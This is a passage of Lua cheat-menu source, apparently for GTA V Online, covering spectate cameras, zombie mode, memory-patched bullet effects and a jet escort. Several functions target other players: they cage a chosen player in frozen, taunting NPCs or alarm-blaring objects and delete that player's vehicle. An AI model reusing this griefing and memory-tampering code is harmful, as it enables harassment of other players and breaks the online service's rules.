    HUD.SET_MINIMAP_IN_SPECTATOR_MODE(true, PLAYER.PLAYER_PED_ID())
end

----上帝视角
function god_cam(toggled, pid)
    godcam = toggled
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid), false)
    local cam_rot = CAM.GET_GAMEPLAY_CAM_ROT()
    local cam = CAM.CREATE_CAM_WITH_PARAMS("DEFAULT_SCRIPTED_CAMERA", pos.x, pos.y, pos.z, cam_rot.y - 90, cam_rot.y, cam_rot.z, 200, true, true)
    CAM.SET_CAM_ACTIVE(cam, true)
    CAM.RENDER_SCRIPT_CAMS(true, true, 1000, true, true, 0)
    NETWORK.NETWORK_SET_IN_SPECTATOR_MODE(true,PLAYER.GET_PLAYER_PED(pid))--观看玩家
    while godcam do
        pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid), false)
        if PED.IS_PED_IN_ANY_VEHICLE(PLAYER.GET_PLAYER_PED(pid),true) then
            CAM.SET_CAM_COORD(cam, pos.x, pos.y, pos.z + 70)
        else
            CAM.SET_CAM_COORD(cam, pos.x, pos.y, pos.z + 10)
        end
        util.yield()
    end
    CAM.SET_CAM_ACTIVE(cam, false)
    CAM.DESTROY_CAM(cam, true)
    CAM.RENDER_SCRIPT_CAMS(false, true, 1000, true, true, 0)
    NETWORK.NETWORK_SET_IN_SPECTATOR_MODE(false,PLAYER.GET_PLAYER_PED(pid))
end

----原力
function atom_force(toggled)
    atom_force_toggle = toggled
    if atom_force_toggle then
        local notif_format = string.format("按 ~%s~ 和 ~%s~ 来使用原力", "INPUT_ATTACK", "INPUT_AIM")
        util.show_corner_help(notif_format)
        local effect = Effect.new("scr_ie_tw", "scr_impexp_tw_take_zone")
        local colour = {r = 0.5, g = 0.0, b = 0.5, a = 1.0}
        request_ptfx_asset(effect.asset)
        GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
        GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(colour.r, colour.g, colour.b)
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(effect.name, PLAYER.PLAYER_PED_ID(), 0.0, 0.0, -0.9,1.0, 1.0,1, 1.0, false, false, false)
    end
    while atom_force_toggle do
        PLAYER.DISABLE_PLAYER_FIRING(PLAYER.PLAYER_ID(), true)
        disable_control_action(24, 25, 68, 91)
        local entities = get_ped_nearby_vehicles(PLAYER.PLAYER_PED_ID())
        for _, vehicle in ipairs(entities) do
            if not (PED.IS_PED_IN_ANY_VEHICLE(PLAYER.PLAYER_PED_ID(), false) and PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false) == vehicle) then
                if PAD.IS_DISABLED_CONTROL_PRESSED(0, 24) then
                    request_control(vehicle, 0)--防止长时间请求
                    ENTITY.APPLY_FORCE_TO_ENTITY(vehicle, 1, 0.0, 0.0, 0.5, 1.0, 1.0,1, 0, false, false, true, false, false)
                elseif PAD.IS_DISABLED_CONTROL_PRESSED(0, 25) then
                    request_control(vehicle, 0)--防止长时间请求
                    ENTITY.APPLY_FORCE_TO_ENTITY(vehicle, 1, 0.0, 0.0, -70.0,1.0, 1.0,1, 0, false, false, true, false, false)
                end
            end
        end
        util.yield()
    end
end

----丧尸模式
function Zombie_Mode(toggle)
    zombie_mode_toggled = toggle
    --心跳
    util.create_tick_handler(function()
        if not zombie_mode_toggled then return false end
        if not PED.IS_PED_DEAD_OR_DYING(PLAYER.PLAYER_PED_ID()) then
            local health = ENTITY.GET_ENTITY_HEALTH(PLAYER.PLAYER_PED_ID())
            if health < 180 then
                util.yield(400)
                FIRE.ADD_EXPLOSION(0,-1500,100, 58, 0.0, true, false, 0.0, true)
                util.yield(200)
                FIRE.ADD_EXPLOSION(0,-1500,100, 58, 0.0, true, false, 0.0, true)
            end
        end
    end)

    while zombie_mode_toggled do
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)
        for i, ped in ipairs(entities.get_all_peds_as_handles()) do
            if ped ~= PLAYER.PLAYER_PED_ID() and not PED.IS_PED_A_PLAYER(ped) then

                calm_ped(ped, true)
                TASK.TASK_COMBAT_PED(ped, PLAYER.PLAYER_PED_ID(), 0, 16)
                TASK.TASK_GO_TO_COORD_ANY_MEANS(ped, pos.x, pos.y, pos.z, 1, 0, false, 15, 0.0)
                local style = "MOVE_M@DRUNK@VERYDRUNK"
                request_anim_set(style)
                PED.SET_PED_MOVEMENT_CLIPSET(ped, style, 1.0)
            end
            util.yield(10)
        end
    
        --扣血
        for _, ped1 in ipairs(entities.get_all_peds_as_handles()) do
            local health = ENTITY.GET_ENTITY_HEALTH(PLAYER.PLAYER_PED_ID())
            local mypos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)
            local ped_pos = ENTITY.GET_ENTITY_COORDS(ped1, false)
            local dist =  Get_distance(mypos, ped_pos, false)
            if 0 < dist and dist < 1 and not ENTITY.IS_ENTITY_DEAD(ped1, false) then
                ENTITY.SET_ENTITY_HEALTH(PLAYER.PLAYER_PED_ID(), health - 20, 0)
            end
        end
    end
end


----允许下蹲
function allow_ducking(toggle)
    duck_toggle = toggle
    local allowDuckingAddr = memory.read_long(memory.read_long(memory.rip(memory.scan("01 48 8B 05 ? ? ? ? 48 8B 48 18") + 4)) + 0x18)
    while duck_toggle do
        memory.write_int(allowDuckingAddr + 0x4DC, 1)
        if PED.GET_PED_STEALTH_MOVEMENT(PLAYER.PLAYER_PED_ID()) then
            TASK.TASK_TOGGLE_DUCK(PLAYER.PLAYER_PED_ID(), PED.IS_PED_DUCKING(PLAYER.PLAYER_PED_ID()) and 0 or 1)
            PED.SET_PED_STEALTH_MOVEMENT(PLAYER.PLAYER_PED_ID(), false, 0)
        end
        util.yield()
    end
    TASK.TASK_TOGGLE_DUCK(PLAYER.PLAYER_PED_ID(), 0)
    memory.write_int(allowDuckingAddr + 0x4DC, 0)
end


----手办背包
function add_props(toggled, v)
    if toggled then
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
        local model = MISC.GET_HASH_KEY(v.Prop)
        request_model(model)
        v.obj = create_object(model, pos.x, pos.y, pos.z)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(v.obj, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 24817), v.PropPlacement[1], v.PropPlacement[2], v.PropPlacement[3], v.PropPlacement[4], v.PropPlacement[5], v.PropPlacement[6], true, true, false, true, 1, true)
    else 
        delete_entity(v.obj)
    end
end


----死亡日志
local Death_Log = filesystem.store_dir() .. 'SakuraScript\\SakuraLog\\Death Log\\Death_Log.txt'
function add_deathlog(time, name, weapon)
    local file, errmsg = io.open(Death_Log, "a+")
    file:write(time..' '..name..' 类型: '..weapon..'\n')
    file:close()
    return input, true
end
function death_log()
    if ENTITY.GET_ENTITY_HEALTH(PLAYER.PLAYER_PED_ID()) < 100 then
        ENTITY.SET_ENTITY_HEALTH(PLAYER.PLAYER_PED_ID(), PED.GET_PED_MAX_HEALTH(PLAYER.PLAYER_PED_ID()))
        local killer = PED.GET_PED_SOURCE_OF_DEATH(PLAYER.PLAYER_PED_ID())
        local time = os.date('%Y-%m-%d %H:%M:%S', os.time())
        if killer == PLAYER.PLAYER_PED_ID() then
            local pname = PLAYER.GET_PLAYER_NAME(PLAYER.PLAYER_ID())
            add_deathlog("["..time.."]", "来自: "..pname, '自杀')
        elseif STREAMING.IS_MODEL_A_PED(ENTITY.GET_ENTITY_MODEL(killer)) then
            if PED.IS_PED_A_PLAYER(killer) then
                local pid = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(killer)
                local pname = PLAYER.GET_PLAYER_NAME(pid)
                add_deathlog("["..time.."]", "来自: "..pname, '被武器击杀')
                util.toast('被'..pname..'使用武器击杀')
            else
                add_deathlog("["..time.."]", "来自: NPC", '被武器击杀')
                util.toast('被NPC击杀')
            end
        elseif STREAMING.IS_MODEL_A_VEHICLE(ENTITY.GET_ENTITY_MODEL(killer)) then
            local vehowner = entities.get_owner(entities.handle_to_pointer(killer))
            if PED.IS_PED_A_PLAYER(vehowner) then
                local pname = PLAYER.GET_PLAYER_NAME(vehowner)
                add_deathlog("["..time.."]", "来自: "..pname, '被载具击杀')
                util.toast('被'..pname..'使用载具击杀')
            else
                add_deathlog("["..time.."]", "来自: NPC", '被载具击杀')
                util.toast('被NPC使用载具击杀')
            end
        end
    end
end
function open_dea_log()
    local DeathlogDir = filesystem.store_dir() .. 'SakuraScript\\SakuraLog\\Death Log'
    util.open_folder(DeathlogDir)
end
function clear_dea_log()
    io.remove(Death_Log)
    notification("~y~~bold~清除完成", math.random(0, 200))
end



--PED笼子
local pedset_def = 'u_m_m_jesus_01'
function Delcar(vic, spec, pid)
    if PED.IS_PED_IN_ANY_VEHICLE(vic) ==true then
        local tarcar = PED.GET_VEHICLE_PED_IS_IN(vic, true)
        GetControl(tarcar, spec, pid)
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(tarcar)
        delete_entity(tarcar)
    end
end
function SetPedCoor(pedS, tarx, tary, tarz)
    ENTITY.SET_ENTITY_COORDS(pedS, tarx, tary, tarz, false, true, true, false)
end
function Teabagtime(p1, p2, p3, p4, p5, p6, p7, p8)
    util.create_tick_handler (function ()
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p1, 'LES1A_DHAC', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p2, 'TUSCO_AHAD', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p3, 'LES1A_DHAC', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p4, 'TUSCO_AHAD', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p5, 'LES1A_DHAC', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p6, 'TUSCO_AHAD', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p7, 'LES1A_DHAC', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p8, 'TUSCO_AHAD', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
        util.yield(100)
    end)
end
function Jesuslovesyou(ped_tab)
    util.create_tick_handler (function ()
        for _, pi in ipairs(ped_tab) do
            AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(pi, 'BUMP', 'JESSE', 'SPEECH_PARAMS_FORCE', 1)
            util.yield(250)
        end
    end)
end
function Trevortime(ped_tab)
    util.create_tick_handler (function ()
        for _, pi in ipairs(ped_tab) do
            AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(pi, 'TR2_ABAJ', 'TREVOR', 'SPEECH_PARAMS_FORCE', 1)
            util.yield(100)
        end
    end)
end
function Fuckyou(ped_tab)
    util.create_tick_handler (function ()
        for _, pi in ipairs(ped_tab) do
            AUDIO.PLAY_PED_AMBIENT_SPEECH_NATIVE(pi, 'GENERIC_FUCK_YOU', 'SPEECH_PARAMS_FORCE', 1)
            util.yield(100)
        end
    end)
end
function Provoke(ped_tab)
    util.create_tick_handler (function ()
        for _, pi in ipairs(ped_tab) do
            AUDIO.PLAY_PED_AMBIENT_SPEECH_NATIVE(pi, 'Provoke_Trespass', 'Speech_Params_Force_Shouted_Critical', 1)
            util.yield(100)
        end

    end)
end
function Insulthigh(ped_tab)
    util.create_tick_handler (function ()
        for _, pi in ipairs(ped_tab) do
            AUDIO.PLAY_PED_AMBIENT_SPEECH_NATIVE(pi, 'Generic_Insult_High', 'SPEECH_PARAMS_FORCE', 1)
            util.yield(100)
        end
    end)
end
function Warcry(ped_tab)
    util.create_tick_handler (function ()
        for _, pi in ipairs(ped_tab) do
            AUDIO.PLAY_PED_AMBIENT_SPEECH_NATIVE(pi, 'GENERIC_WAR_CRY', 'SPEECH_PARAMS_FORCE', 1)
            util.yield(100)
        end

    end)
end
function Pedspawn(pedhash, tar1)
    request_model(pedhash)
    local pedS = entities.create_ped(1, pedhash, tar1, 0)
    ENTITY.SET_ENTITY_INVINCIBLE(pedS, true)
    ENTITY.FREEZE_ENTITY_POSITION(pedS, true)
    PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(pedS, true)
    PED.SET_PED_CAN_LOSE_PROPS_ON_DAMAGE(pedS, false)
    if pedhash == util.joaat('ig_lestercrest') then
        PED.SET_PED_PROP_INDEX(pedS, 1)
    end
    return pedS
end
function Runanim(ent, animdict, anim)
    TASK.TASK_PLAY_ANIM(ent, animdict, anim, 1.0, 1.0, -1, 3, 0.5, false, false, false)
    while ENTITY.IS_ENTITY_PLAYING_ANIM(ent, animdict, anim, 3) ==false do
        TASK.TASK_PLAY_ANIM(ent, animdict, anim, 1.0, 1.0, -1, 3, 0.5, false, false, false)
        util.yield()
    end
end
function PFP(pedm, playerm)--Ped Facing Player adapted from PhoenixScript
    local ppos = ENTITY.GET_ENTITY_COORDS(playerm)
    local pmpos = ENTITY.GET_ENTITY_COORDS(pedm)
    local hx = ppos.x - pmpos.x
    local hy = ppos.y - pmpos.y
    local head = MISC.GET_HEADING_FROM_VECTOR_2D(hx, hy)
    return ENTITY.SET_ENTITY_HEADING(pedm, head)
end
function DelEnt(ped_tab)
    for _, Pedm in ipairs(ped_tab) do
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(Pedm)
        delete_entity(Pedm)
    end
end
function Stopsound()
    for i = 0, 99 do
        AUDIO.STOP_SOUND(i)
    end
end
function IPM(targets, tar1, pname, cage_table, pid)
    local tar2 = ENTITY.GET_ENTITY_COORDS(targets)
    local disbet = SYSTEM.VDIST2(tar2.x, tar2.y, tar2.z, tar1.x, tar1.y, tar1.z)
    if disbet < 0.5  then
        util.yield(800)
    elseif disbet >= 0.5  then
        DelEnt(cage_table[pid])
        cage_table[pid] = false
        Stopsound()
    end
end
function select_ped_cage(index)
    pedset_def = pedset_cage.value[index]
end
function auto_ped_cage(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local targets = PLAYER.GET_PLAYER_PED(pid)
    local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
    local pname = PLAYER.GET_PLAYER_NAME(pid)
    if not ped_cage_table[pid] then
        local peds = {}
        local pedhash = util.joaat(pedset_def)
        local ped_tab = {'p1', 'p2', 'p3', 'p4', 'p5', 'p6', 'p7', 'p8'}
        for _, spawned_ped in ipairs(ped_tab) do
            spawned_ped = Pedspawn(pedhash, tar1)
            table.insert(peds,  spawned_ped)
        end
        SetPedCoor(peds[1], tar1.x, tar1.y - 0.5, tar1.z - 1.0)
        SetPedCoor(peds[2], tar1.x - 0.5, tar1.y - 0.5, tar1.z - 1.0)
        SetPedCoor(peds[3], tar1.x - 0.5, tar1.y, tar1.z - 1.0)
        SetPedCoor(peds[4], tar1.x - 0.5, tar1.y + 0.5, tar1.z - 1.0)
        SetPedCoor(peds[5], tar1.x, tar1.y + 0.5, tar1.z - 1.0)
        SetPedCoor(peds[6], tar1.x + 0.5, tar1.y + 0.5, tar1.z - 1.0)
        SetPedCoor(peds[7], tar1.x + 0.5, tar1.y, tar1.z - 1.0)
        SetPedCoor(peds[8], tar1.x + 0.5, tar1.y - 0.5, tar1.z - 1.0)
        if pedhash == util.joaat('IG_LesterCrest')  then
            Teabagtime(peds[1], peds[2], peds[3], peds[4], peds[5], peds[6], peds[7], peds[8])
        elseif pedhash == util.joaat('player_two') then
            Trevortime(peds)
        elseif pedhash == util.joaat('u_m_m_jesus_01') then
            Jesuslovesyou(peds)  
        elseif pedhash ~= util.joaat('IG_LesterCrest') or util.joaat('player_two') then
            if GENERIC_AUDIO.DOES_CONTEXT_EXIST_FOR_THIS_PED(peds[1], 'GENERIC_FUCK_YOU') ==true then 
                Fuckyou(peds)
            elseif GENERIC_AUDIO.DOES_CONTEXT_EXIST_FOR_THIS_PED(peds[1], 'Provoke_Trespass') then 
                Provoke(peds)
            elseif GENERIC_AUDIO.DOES_CONTEXT_EXIST_FOR_THIS_PED(peds[1], 'Generic_Insult_High') then 
                Insulthigh(peds)
            elseif GENERIC_AUDIO.DOES_CONTEXT_EXIST_FOR_THIS_PED(peds[1], 'GENERIC_WAR_CRY') then 
                Warcry(peds)
            end
        end
        request_anim_dict('rcmpaparazzo_2')
        request_anim_dict('mp_player_int_upperfinger')
        request_anim_dict('misscarsteal2peeing')
        request_anim_dict('mp_player_int_upperpeace_sign')
        local ped_anim = {peds[2], peds[3], peds[4], peds[5], peds[6], peds[7], peds[8]}
        for _, Pedanim in ipairs(ped_anim) do
            if pedhash == util.joaat('player_two') then
                Runanim(Pedanim, 'misscarsteal2peeing','peeing_loop')
                local tre = PED.GET_PED_BONE_INDEX(Pedanim, 0x2e28)
                request_ptfx_asset('core')
                GRAPHICS.USE_PARTICLE_FX_ASSET('core')
                GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("ent_amb_peeing", Pedanim, 0, 0, 0, -90, 0, 0, tre, 2, false, false, false, 0, 0, 0, 0)
            elseif pedhash == util.joaat('u_m_m_jesus_01') then
                Runanim(peds[1], 'mp_player_int_upperpeace_sign', 'mp_player_int_peace_sign')
                Runanim(Pedanim, 'mp_player_int_upperpeace_sign', 'mp_player_int_peace_sign')
            else
                Runanim(Pedanim, 'mp_player_int_upperfinger', 'mp_player_int_finger_02_fp')
                Runanim(peds[1], 'rcmpaparazzo_2', 'shag_loop_a')
            end
        end
        for _, Pedm in ipairs(peds) do
            PFP(Pedm, targets)
        end
        ped_cage_table[pid] = peds
    end
    while ped_cage_table[pid] do
        if players.exists(pid) then
            IPM(targets, tar1, pname, ped_cage_table, pid)
        end
    end
end


----物体笼子
local objcageset = 'prop_mineshaft_door'   
function select_obj_cage(index)
    objcageset = objsetcage.value[index]
end
function ObjFrezSpawn(hsel, tar1)
    local objHash = hsel
  local objfS =  OBJECT.CREATE_OBJECT(objHash, tar1.x, tar1.y, tar1.z, true, true, true)
  ENTITY.FREEZE_ENTITY_POSITION(objfS, true)
  return objfS
end
function SetObjCo(objS, tarx, tary, tarz)
    ENTITY.SET_ENTITY_COORDS(objS, tarx, tary, tarz, false, true, true, false)
end
function auto_obj_cage(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local targets = PLAYER.GET_PLAYER_PED(pid)
    local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
    local pname = PLAYER.GET_PLAYER_NAME(pid)
    if not obj_table[pid] then
        local objs = {}
        local spec = menu.get_value(menu.ref_by_rel_path(menu.player_root(pid), "Spectate>Nuts Method"))
        Delcar(targets, spec, pid)
        local hsel = util.joaat(objcageset)
        request_model(hsel)
        local obj_tab = {'o1', 'o2', 'o3', 'o4', 'o5', 'o6', 'o7', 'o8'}
        for _, spawned_obj in ipairs(obj_tab) do
            spawned_obj =  ObjFrezSpawn(hsel, tar1)
            table.insert(objs,  spawned_obj)
        end
        obj_table[pid] = objs
        SetObjCo(objs[1], tar1.x, tar1.y - 0.5, tar1.z - 1.0)
        SetObjCo(objs[2], tar1.x - 0.5, tar1.y - 0.5, tar1.z - 1.0)
        SetObjCo(objs[3], tar1.x - 0.5, tar1.y, tar1.z - 1.0)
        SetObjCo(objs[4], tar1.x - 0.5, tar1.y + 0.5, tar1.z - 1.0)
        SetObjCo(objs[5], tar1.x, tar1.y + 0.5, tar1.z - 1.0)
        SetObjCo(objs[6], tar1.x + 0.5, tar1.y + 0.5, tar1.z - 1.0)
        SetObjCo(objs[7], tar1.x + 0.5, tar1.y, tar1.z - 1.0)
        SetObjCo(objs[8], tar1.x + 0.5, tar1.y - 0.5, tar1.z - 1.0)
        ENTITY.SET_ENTITY_ROTATION(objs[1], 0, 0, 180, 1, true)
        ENTITY.SET_ENTITY_ROTATION(objs[2], 0, 0, 135, 1, true)
        ENTITY.SET_ENTITY_ROTATION(objs[3], 0, 0, 90, 1, true)
        ENTITY.SET_ENTITY_ROTATION(objs[4], 0, 0, 45, 1, true)
        ENTITY.SET_ENTITY_ROTATION(objs[6], 0, 0, 315, 1, true)
        ENTITY.SET_ENTITY_ROTATION(objs[7], 0, 0, 270, 1, true)
        ENTITY.SET_ENTITY_ROTATION(objs[8], 0, 0, 225, 1, true)
        for _, horn in ipairs(objs) do
            AUDIO.PLAY_SOUND_FROM_ENTITY(-1, 'Alarm_Interior', horn, 'DLC_H3_FM_FIB_Raid_Sounds', 0, 0)
        end
    end
    while obj_table[pid] do
        if players.exists(pid) then
            IPM(targets, tar1, pname, obj_table, pid)
        end
    end
end


----更改子弹类型
function change_bullet_type()
	for id, data in pairs(weapon_stuff) do
        local name = data[1]
        menu.toggle_loop(weapon_bullet, name, {}, "", function()
            local weapon_name = data[2]
            local weapon = util.joaat(weapon_name)
            request_weapon_asset(weapon)
            local inst = v3.new()
            if PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) then
                if not WEAPON.GET_PED_LAST_WEAPON_IMPACT_COORD(PLAYER.PLAYER_PED_ID(), inst) then
                    local final_rot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
                    v3.set(inst, final_rot.x,final_rot.y,final_rot.z)
                    local tmp = v3.toDir(inst)
                    v3.set(inst, v3.get(tmp))
                    v3.mul(inst, 1000)
                    local final_coord = CAM.GET_FINAL_RENDERED_CAM_COORD()
                    v3.set(tmp, final_coord.x,final_coord.y,final_coord.z)
                    v3.add(inst, tmp)
                end
                local x, y, z = v3.get(inst)
                local wpEnt = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(PLAYER.PLAYER_PED_ID(), 0)
                local wpCoords = ENTITY1._GET_ENTITY_BONE_POSITION_2(wpEnt, ENTITY.GET_ENTITY_BONE_INDEX_BY_NAME(wpEnt, "gun_muzzle"))
                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(wpCoords.x, wpCoords.y, wpCoords.z, x, y, z, 1, true, weapon, PLAYER.PLAYER_PED_ID(), true, false, 1000)
            end
        end)
    end
end

----更改子弹效果
local bullet_style_tbl = {}
function change_bullet_style(index)
    bullet_style_value = index
    while bullet_style_value ~= 1 do
        local pCPed = entities.handle_to_pointer(PLAYER.PLAYER_PED_ID())
        local pCPedWeaponManager = memory.read_long(pCPed + 0x10B8)
        local pCWeaponInfo = memory.read_long(pCPedWeaponManager + 0x20)

        --启用子弹类型（字节），0x02:Fists，0x03:Bullet，0x05:Explosion
        memory.write_byte(pCWeaponInfo + 0x20, 5)

        --设置
        if pCWeaponInfo >= 0x10000 or pCWeaponInfo < 0x000F000000000000 then --判断地址是否无效
            memory.write_int(pCWeaponInfo + 0x24, index - 2)
        end

        table.insert(bullet_style_tbl, pCWeaponInfo)
        util.yield()
    end
    if bullet_style_value == 1 then
        for k, v in pairs(bullet_style_tbl) do
            memory.write_byte(v + 0x20, 3)
            if v >= 0x10000 or v < 0x000F000000000000 then
                memory.write_int(v + 0x24, -1)
            end
        end
    end
end
----更改弹药效果
function change_ammo_effect(index)
    explosion_id = index - 2
    local pos = v3.new()
    while explosion_id ~= -1 do
        if WEAPON.GET_PED_LAST_WEAPON_IMPACT_COORD(PLAYER.PLAYER_PED_ID(), pos) then
            FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, explosion_id, 1.0, true, false, 1, false)
        end
        util.yield()
    end
end



----空中梯队
function escort()
    local heading = ENTITY.GET_ENTITY_HEADING(PLAYER.PLAYER_PED_ID())
    local hashJet = util.joaat("Lazer")
    local hashTarget = 1082797888 --:1082797888
    request_model(hashJet)
    request_model(hashTarget)

    --CREATE_PED_INSIDE_VEHICLE
    local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 0, 0, 200)
    local aJetpos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), -50, -50, 200) --200
    local bJetpos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 50, -50, 200)
    local cJetpos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), -50, -100, 200)
    local dJetpos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 50, -100, 200)
    local aJetAimpos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), -20, 0, 0)
    local bJetAimpos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 20, 0, 0)
    local cJetAimpos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), -40, -40, 0) --200
    local dJetAimpos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 40, -40, 0) --200

    if not PED.IS_PED_IN_ANY_VEHICLE(PLAYER.PLAYER_PED_ID()) then
        PlayerJet = entities.create_vehicle(hashJet, pos, heading)
        
        aTarget = entities.create_object(hashTarget, aJetAimpos)--obj
        bTarget = entities.create_object(hashTarget, bJetAimpos)
        cTarget = entities.create_object(hashTarget, cJetAimpos)
        dTarget = entities.create_object(hashTarget, dJetAimpos)
        ENTITY.SET_ENTITY_COLLISION(aTarget, false, false)
        ENTITY.SET_ENTITY_VISIBLE(aTarget, false, false)
        ENTITY.SET_ENTITY_COLLISION(bTarget, false, false)
        ENTITY.SET_ENTITY_VISIBLE(bTarget, false, false)
        ENTITY.SET_ENTITY_COLLISION(cTarget, false, false)
        ENTITY.SET_ENTITY_VISIBLE(cTarget, false, false)
        ENTITY.SET_ENTITY_COLLISION(dTarget, false, false)
        ENTITY.SET_ENTITY_VISIBLE(dTarget, false, false)

        PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), PlayerJet, -1)
        VEHICLE.CONTROL_LANDING_GEAR(PlayerJet, 3)--控制起落架
        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(PlayerJet, 1, 0, 100, 0, true, true, true, true)

        JetA = entities.create_vehicle(hashJet, aJetpos, heading)--创建飞机
        JetB = entities.create_vehicle(hashJet, bJetpos, heading)
        JetC = entities.create_vehicle(hashJet, cJetpos, heading)
        JetD = entities.create_vehicle(hashJet, dJetpos, heading)

        PilotA = PED.CREATE_RANDOM_PED_AS_DRIVER(JetA, 1)--创建驾驶飞机的PED
        VEHICLE.SET_VEHICLE_ENGINE_ON(JetA, true, true, 0)
        
        PilotB = PED.CREATE_RANDOM_PED_AS_DRIVER(JetB, 1)
        VEHICLE.SET_VEHICLE_ENGINE_ON(JetB, true, true, 0)
        
        PilotC = PED.CREATE_RANDOM_PED_AS_DRIVER(JetC, 1)
        VEHICLE.SET_VEHICLE_ENGINE_ON(JetC, true, true, 0)
        
        PilotD = PED.CREATE_RANDOM_PED_AS_DRIVER(JetD, 1)
        VEHICLE.SET_VEHICLE_ENGINE_ON(JetD, true, true, 0)

        --防止npc攻击自己
        calm_ped(PilotA, true);calm_ped(PilotB, true);calm_ped(PilotC, true);calm_ped(PilotD, true)

        ENTITY.SET_ENTITY_INVINCIBLE(PlayerJet, true)
        ENTITY.SET_ENTITY_INVINCIBLE(JetA, true)
        ENTITY.SET_ENTITY_INVINCIBLE(JetB, true)
        ENTITY.SET_ENTITY_INVINCIBLE(JetC, true)
        ENTITY.SET_ENTITY_INVINCIBLE(JetD, true)
    end
    while PED.IS_PED_IN_VEHICLE(PLAYER.PLAYER_PED_ID(), PlayerJet, false) do 
        set_entity_face_entity(JetA, aTarget, true)
        set_entity_face_entity(JetB, bTarget, true)
        set_entity_face_entity(JetC, cTarget, true)
        set_entity_face_entity(JetD, dTarget, true)

        local aJetAimpos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), -20, 0, 0)
        local bJetAimpos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 20, 0, 0)
        local cJetAimpos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), -40, -40, 0) --200
        local dJetAimpos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 40, -40, 0) --200
        local aJetRealLoc = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(JetA, 0, 0, 0)
        local bJetRealLoc = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(JetB, 0, 0, 0)
        local cJetRealLoc = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(JetC, 0, 0, 0)
